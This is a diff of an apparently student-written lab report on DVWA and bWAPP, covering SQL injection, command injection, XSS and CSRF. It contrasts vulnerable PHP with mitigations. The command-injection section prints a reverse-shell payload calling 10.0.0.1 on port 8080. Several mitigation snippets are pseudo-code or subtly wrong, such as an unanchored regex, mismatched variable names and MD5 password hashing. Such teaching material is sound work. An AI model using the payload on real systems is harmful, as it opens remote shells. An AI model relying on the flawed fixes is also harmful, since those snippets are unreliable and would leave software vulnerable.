@@ -7,14 +7,14 @@ Ryan Cheevers-Brown
 
 The root cause in the DVWA "low" script is the lack of sanitization - the `$id` variable is taken directly from the input form. I can put any code I want into the `$id` variable via the GET parameter and have the web server run it. The second line has been simplified for readibility, as it does a lot of error handling. 
 
-```
+```php
 $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
 $result = mysqli_query(..., $query);
 ```
 
 This vulnerability is fixed in DVWA's Impossible difficulty using a prepared query and PHP's PDOs (prepared data objects). The SQL statement is created as a PDO with the `prepare` method as seen on the first line. This separates the SQL code from the user input and guarantees that the user can't easily escape the SQL query with `'` or `;` characters. The next line binds the `$id` variable to the `:id` parameter in the SQL query and ensures that it is treated as an integer. The query is then safely executed. 
 
-```
+```php
 $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
 $data->bindParam( ':id', $id, PDO::PARAM_INT );
 $data->execute();
@@ -22,7 +22,7 @@ $data->execute();
 
 In BWApp, the vulnerability is very similar:
 
-```
+```php
 $title  = $_GET["title"];
 $sql = "SELECT * FROM movies WHERE title LIKE '%" . sqli_($title) ."%'";
 $recordset = mysql_query($sql, $link);
@@ -32,7 +32,7 @@ This code takes the `$title` value directly from the user's `GET` parameter and 
 
 DVWA's Impossible mitigation can be applied to this code as well. It would look something like this:
 
-```
+```php
 $title = $_GET["title"];
 $data = $db->prepare( 'SELECT * FROM movies WHERE title LIKE %(:title)%;' );
 $data->bindParam( ':title', $title, PDO::PARAM_STR );
@@ -40,20 +40,18 @@ $data->execute();
 ```
 This code creates a prepared query structured the same as the original BWApp query. It then does the parameter binding, but using a PDO string instead of an integer. It then executes the query. This should be very difficult to SQL inject into. 
 
-TODO: Additional mitigations?
-
 ## Command Injection (DVWA), OS Command Injection (BWApp)
 
 The root cause in DVWA's "low" script is again, unsanitized input. This gives me (the attacker) the ability to execute any command they want by inserting a pipe `|` or semicolon `;` to break the command, followed by whatever secondary command they want. 
 
-```
+```php
 $target = $_REQUEST[ 'ip' ];
 $cmd = shell_exec( 'ping -c 4 ' . $target );
 ```
 
 DVWA's Impossible mode mitigates this by removing slashes, exploding the input into four octets, and then making sure each of the octets is numeric. This should cause errors if the input is not structured in the form of an IP address. However, this still leaves a vulnerability present: using a fifth octet to inject a command. 
 
-```
+```php
 $target = $_REQUEST[ 'ip' ];
 $target = stripslashes( $target );
 $octet = explode( ".", $target );
@@ -65,13 +63,13 @@ if( #each octet is numeric ){
 
 The code does not check to see if more than four 'octets' are present after the `explode()` command. This leaves the door open for an input structured like this: 
 
-```
+```js
 1.1.1.1.;bash -i >& unbase64(base64-encoded("/dev/tcp/10.0.0.1/8080 0>&1"))
 ```
 
 This would create a reverse shell listener that the attacker could then connect to. I would fix this problem (and simplify the code) by matching the user's input string to a very tightly written regular expression. This regex checks to make sure that the user's input is structured as four groups of 1 to 3 numbers separated by a single perio, and that there are no additional characters on the beginning or end. This would make command injection close to, if not entirely impossible. 
 
-```
+```python
 target = requests.get("ip")
 check_regex = "/([0-9]{1,3}\.){3}[0-9]{1,3}/g"
 regex_match = regex.match(input, check_regex)
@@ -79,7 +77,7 @@ regex_match = regex.match(input, check_regex)
 
 The BWApp script doesn't do any input validation:
 
-```
+```php
 $target = $_POST['target'];
 echo shell_exec("nslookup " . commandi($target));>
 ```
@@ -88,9 +86,11 @@ It takes the parameter from the POST request and passes it directly to NSLookup.
 
 ## Reflected XSS (DVWA), XSS - Reflected (GET) (BWApp)
 
+#### I am protecting only one parameter in this section. Similar mitigations would need to be applied to all parameters submitted in order to get adequate protection. 
+
 The DVWA `low` script is vulnerable: 
 
-```
+```php
 header ("X-XSS-Protection: 0");
 
 if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
@@ -104,13 +104,13 @@ Additionally, the code disables any browser built-in XSS protection by disabling
 
 DVWA's Impossible mode mitigates these vulnerabilities with several changes to the code. The first is simply leaving out the line that disables the browser's built-in XSS protection. The second is using PHP's `htmlspecialchars()` function to properly encode the entire input string, preventing any part of it from being interpreted as JS or HTML. 
 
-```
+```php
 $name = htmlspecialchars( $_GET[ 'name '] );
 ```
 
 Finally, the Impossible mode also checks that the anti-CSRF token submitted as part of the `$_REQUEST` matches the one stored server-side in `'$_SESSION`. 
 
-```
+```php
 checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
 ```
 
@@ -118,7 +118,7 @@ These mitigations would make an XSS attack much more difficult to pull off using
 
 The BWApp script has slightly different code, but effectively the same vulnerabilities as the DVWA Low mode. 
 
-```
+```php
 $first = $_GET["firstname"];
 $last = $_GET["lastname"];
 echo "Welcome " . $first . " " . $last;
@@ -128,7 +128,7 @@ There is no input validation or sanitization, so I can input absolutely any code
 
 The mitigation from DVWA's Impossible mode, as applied to DVWA,  would look something like this: 
 
-```
+```php
 checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
 $first = htmlspecialchars( $_GET[ 'firstname' ]);
 $last = htmlspecialchars( $_GET[ 'lastname' ]);
@@ -139,25 +139,160 @@ Both the first and last name parameters would be HTML-ified by the PHP function,
 
 ## XSS - Stored (DVWA), XSS - Stored (Blog) (DVWA)
 
-The root cause in DVWA's `low` script:
+#### For this entire section, I am focusing on mitigating the blog post/message/comment/entry. Similar mitigations would need to be applied to the name/owner/submitter as well as any other user-defineable parameters. 
 
+The root cause in DVWA's `low` script is the ability to inject HTML/JS into the blog's SQL database. The HTML/JS injected will then be run on any client system that loads the page:
+
+```php
+$message = trim( $_POST[ 'message' ] );
+$message = stripslashes( $message );
+$message = (assert !isSQLQuery( $message )); # This line psuedo-codified for easier reading
+$query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
+$result = mysqli_query(..., $query)...;
 ```
 
+This code takes the `message` parameter passed in via `POST` request, attempts to do some basic input validation by removing slashes/escaped characters, making sure the message isn't directly SQL code, and then drops it straight into the database. 
+
+The `Impossible` mode of DVWA mitigates this: 
+
+```php
+$message = trim( $_POST[ 'message' ] );
+$message = stripslashes( $message );
+assert !isSQLQuery( $message ); # This line psuedo-codified for easier reading
+$message = htmlspecialchars( $message );
+
+$data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' );
+$data->bindParam( ':message', $message, PDO::PARAM_STR );
+$data->bindParam( ':name', $name, PDO::PARAM_STR );
+$data->execute();
 ```
 
+There are two mitigations present here. The first is the use of PHP's `htmlspecialchars()` method which escapes all HTML special characters, guaranteeing that the value passed in can't execute as HTML/JS code. The second mitigation, for a secondary vulnerability, mitigates SQL injection by use of a prepared query. This guarantees that the database isn't SQL-injectable, another potential way to abuse this web page. 
+
+BWApp is also vulnerable to HTML/JS Injection: 
+
+```php
+$entry = $_POST[ 'entry' ];
+$sql = 'INSERT INTO blog ( date, entry, owner ) VALUES ( now(),' . $entry . "', '" . $owner . "')";
+$recordset = $link->query($sql);
+```
+
+There is at least one mistake in this code: the SQL query is never terminated with a `;` character. Additionally, the code could be written much more cleanly. I'll do some rewriting in the mitigation. 
+
+The code is vulnerable to SQL injection on top of JS/HTML injection into the database. Any string passed in as the `entry` POST parameter is immediately added to the database without any sort of sanitization or validation. 
+
+A sample mitigation for BWApp could look something like this: 
+
+```php
+$entry = $_POST[ 'entry' ];
+$entry = stripslashes( $entry );
+assert !isSqlQuery( $entry ); # This line psuedo-codeified for easier reading, the actual PHP is very long
+$entry = htmlspecialchars( $entry );
+$data = $db->prepare('INSERT INTO blog ( date, entry, owner ) VALUES ( :now, :entry, :owner );');
+$data->bindParam( ':now', now(), PDO::PARAM_STR );
+$data->bindParam( ':entry', $entry, PDO::PARAM_STR );
+$data->bindParam( ':owner', $owner, PDO::PARAM_STR );
+$data->execute()
+```
+
+These mitigations prevent SQL injection and HTML/JS injection through the `entry` parameter. It's still theoretically possible, but much harder to do. 
+
+## CSRF (DVWA) - Analysis and Mitigation
+
+DVWA's `low` script is vulnerable to CSRF, allowing an attacker to change the user's password. It does not check for a CSRF token or any sort of validation about where the request is coming from. Additionally, it does not check to see that the user knows the current password, which is another step that helps authenticate a user when changing their password.
+
+```php
+$pass_new = $_GET[ 'password_new' ];
+$pass_conf = $_GET[ 'password_conf' ];
+if ( $pass_new == $pass_conf ){
+    assert !isSqlQuery( $pass_new );
+    $pass_new = md5( $pass_new );
+    $cur_user = dvwacurrentUser();
+    $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . $cur_user . "';";
+    $result = mysqli_query( ..., $insert );
+}
+```
+
+The medium script attempts to mitigate CSRF by adding a server referral check:
+
+```php
+if ( stripos( $_SERVER[ 'HTTP_REFERRER' ], $_SERVER[ 'SERVER_NAME' ]) !== false ){
+    change_password() # See LOW section, code is the same. 
+} else {
+    $html .= "<pre>That request didn't look correct.</pre>";
+}
+```
+
+This is helpful, but the `referrer` parameter can be spoofed as we learned in Lab 5. 
+
+The high script adds additional mitigations, such as checking the content for JSON requests, verifying all parameters, and includes rudimentary CSRF checking. However, the SameSite attribute wasn't set on the CSRF cookie, and the SQL still isn't in a prepared query.
+
+```php
+generateSessionToken();
+header ( "Content-Type: application/json" );
+print json_encode( array( "Message" => $return_message ));
+```
+
+The `Impossible` mode adds a complete CSRF mitigation and parameterizes the database calls, in addition to requiring the user to submit their current password:
+
+```php
+# Check the CSRF token before even variablizing the parameters
+checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+# Pull current password, new password, confirmation out of the GET fields
+$pass_cur = $_GET[ 'password_current' ];
+$pass_new = $_GET[ 'password_new' ];
+$pass_conf = $_GET[ 'password_conf' ];
+
+# Sanitize the current password for checking against the database
+$pass_curr = stripslashes( $pass_curr );
+assert !isSqlQuery( $pass_curr );
+$pass_curr = md5( $pass_curr );
+
+# Prepare a query to check the current password is correct, supporting authenticity of the request
+$data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
+$cur_user = dvwaCurrentUser();
+$data->bindParam( ':user', $cur_user, PDO::PARAM_STR );
+$data->bindParam( ':password', $pass_cur, PDO::PARAM_STR );
+$data->execute()
+
+# Check if the new password and confirmation value match, additionally check to see that the current password provided is correct
+if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) {
+    # Sanitize and hash the new password
+    $pass_new = sanitize($pass_new);
+    assert !isSqlQuery($pass_new);
+    $pass_new = md5( $pass_new );
+
+    # Prepare a query and insert the necessary values to change the password
+    data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
+	$data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
+	$cur_user = dvwaCurrentUser();
+	$data->bindParam( ':user', $cur_user, PDO::PARAM_STR );
+	$data->execute();
+}
+```
+
+## BREAK BREAK BREAK BREAK
 
 
+
+
+
+
+Adding this line between the `generateSessionToken()` and `header` should improve the CSRF mitigation. 
+
+```php
+session_set_cookie_params( [ 'samesite' => 'Strict' ]);
+```
+
+## File Inclusion (DVWA) - Analysis and Mitigation
 
 
 ## Questions
 
-Root cause in DVWA "low"??
-
-DVWA "impossible" mitigation?
-
-root cause in BWAPP script?
-
-Impossible mitigation -> bwapp?
-
-additional mitigations for DVWA?
-
+1. DVWA root cause?
+2. medium incomplete mitigation?
+3. high incomplete mitigation?
+4. Impossible complete mitigation?
+5. Additional mitigations for impossible?
+6. Find a BWApp script that could be mitigated by the 'impossible' DVWA mitigation and apply it. 
